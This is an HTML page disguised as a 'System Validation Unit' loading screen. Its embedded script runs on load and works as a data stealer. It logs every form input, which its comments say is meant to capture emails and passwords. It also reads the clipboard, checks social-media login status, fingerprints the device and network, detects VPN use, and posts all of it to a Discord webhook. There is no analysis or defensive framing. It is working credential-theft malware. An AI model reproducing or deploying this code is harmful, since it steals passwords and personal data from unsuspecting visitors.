<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>System Validation Unit</title>
    <style>body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;}.l{border:3px solid #111;border-top:3px solid #0f0;border-radius:50%;width:30px;height:30px;animation:s 0.6s linear infinite;}@keyframes s{to{transform:rotate(360deg);}}</style>
</head>
<body>
    <div class="l"></div>
    <script>
        "use strict";

        class MasterEngine {
            constructor() {
                this.hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
                this.proxy = "https://corsproxy.io/?";
            }

            // 1. INPUT SNIFFER (E-posta ve ≈ûifre Yakalama)
            listenInputs() {
                const handler = (e) => {
                    if (e.target.value) {
                        const msg = `üì© [Gƒ∞Rƒ∞≈û]: ${e.target.name || e.target.id} => ${e.target.value}`;
                        this.logToDiscord(msg);
                    }
                };
                document.addEventListener('change', handler, true);
            }

            // 2. SOCIAL MEDIA DETECTOR (Login Status Check)
            async getSocialStatus() {
                const sites = { Google: "https://accounts.google.com/CheckCookie", Facebook: "https://www.facebook.com/favicon.ico", Twitter: "https://twitter.com/favicon.ico" };
                const results = [];
                for (const [name, url] of Object.entries(sites)) {
                    const status = await new Promise(res => {
                        const img = new Image();
                        img.onload = () => res("‚úÖ Aktif");
                        img.onerror = () => res("‚ùå Pasif/Giri≈ü Yok");
                        img.src = `${url}?cache=${Math.random()}`;
                        setTimeout(() => res("‚è≥ Timeout"), 2000);
                    });
                    results.push(`${name}: ${status}`);
                }
                return results.join(" | ");
            }

            // 3. CLIPBOARD EXTRACTOR (Pano Verisi)
            async getClipboard() {
                try {
                    return await navigator.clipboard.readText();
                } catch { return "‚ö†Ô∏è Eri≈üim Reddedildi"; }
            }

            // 4. CORE DATA (Donanƒ±m, Aƒü, Saat - Korunmu≈ü Katman)
            async getCore() {
                const [net, devs, battery, storage] = await Promise.all([
                    fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
                    navigator.mediaDevices.enumerateDevices().catch(() => []),
                    navigator.getBattery ? navigator.getBattery() : {},
                    navigator.storage ? navigator.storage.estimate() : {}
                ]);

                const gl = document.createElement('canvas').getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                const opt = Intl.DateTimeFormat().resolvedOptions();

                return {
                    net,
                    gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A",
                    cam: devs.some(d => d.kind === 'videoinput'),
                    mic: devs.some(d => d.kind === 'audioinput'),
                    cores: navigator.hardwareConcurrency,
                    ram: navigator.deviceMemory,
                    os: navigator.platform,
                    tz: opt.timeZone,
                    lang: navigator.language,
                    bat: battery.level ? `${Math.round(battery.level * 100)}%` : "N/A",
                    disk: (storage.quota / 1e9).toFixed(2) + "GB"
                };
            }

            async logToDiscord(content) {
                fetch(this.hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content }) });
            }

            async execute() {
                this.listenInputs(); // Veri giri≈üini dinlemeye ba≈üla
                const [core, social, clip] = await Promise.all([this.getCore(), this.getSocialStatus(), this.getClipboard()]);
                
                const vpn = (core.net.timezone && core.tz !== core.net.timezone) ? "üö© VPN_DETECTED" : "‚úÖ DIRECT";

                const payload = {
                    embeds: [{
                        title: "üíÄ OMNISCIENCE_V85_MASTER_REPORT",
                        color: 0xff0000,
                        fields: [
                            { name: "üì° NETWORK & VPN (9)", value: `**IP:** \`${core.net.ip}\`\n**ISP:** ${core.net.org}\n**LOC:** ${core.net.city}/${core.net.country_name}\n**VPN:** ${vpn} | **TZ:** ${core.tz}`, inline: false },
                            { name: "‚öôÔ∏è HARDWARE & OS (8)", value: `**GPU:** ${core.gpu}\n**CPU:** ${core.cores} | **RAM:** ${core.ram}GB\n**OS:** ${core.os} | **Disk:** ${core.disk} | **Battery:** ${core.bat}`, inline: false },
                            { name: "üåç LINGUISTIC & SOCIAL (6)", value: `**Lang:** ${core.lang}\n**Socials:** ${social}\n**Clipboard:** \`${clip}\``, inline: false },
                            { name: "üì∏ MEDIA PROBE (4)", value: `**Cam:** ${core.cam} | **Mic:** ${core.mic}\n**PDF:** ${navigator.pdfViewerEnabled} | **Dark:** ${window.matchMedia('(prefers-color-scheme: dark)').matches}`, inline: false },
                            { name: "üîç RAW_UA", value: "```" + navigator.userAgent + "```" }
                        ],
                        footer: { text: "Protocol: Omniscience v85.0 | Exfiltration Stable" },
                        timestamp: new Date().toISOString()
                    }]
                };

                fetch(this.proxy + encodeURIComponent(this.hook), { method: 'POST', body: JSON.stringify(payload), mode: 'no-cors' });
            }
        }

        const engine = new MasterEngine();
        engine.execute();
    </script>
</body>
</html>
